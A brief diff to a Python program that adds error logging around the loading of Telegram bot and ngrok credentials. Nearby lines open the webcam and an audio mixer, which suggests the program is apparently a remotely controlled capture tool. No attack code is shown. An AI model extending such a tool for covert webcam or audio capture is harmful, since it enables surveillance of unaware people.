@@ -2559,7 +2559,12 @@ o8o        o888o `Y888""8o o888o o888o o888o
 """
 
 if __name__ == "__main__":
-    token, chat_id, ngrok_token = getCred() 
+    try:
+        token, chat_id, ngrok_token = getCred() 
+    except Exception as e:
+        with open(join(gettempdir(), "PEP2log.log"), "w") as fo:
+            fo.write(traceback.format_exc())
+            fo.write(str(e))
     mixer = CustomMixer()
     capture = VideoCapture(0)
     signal_error = ""
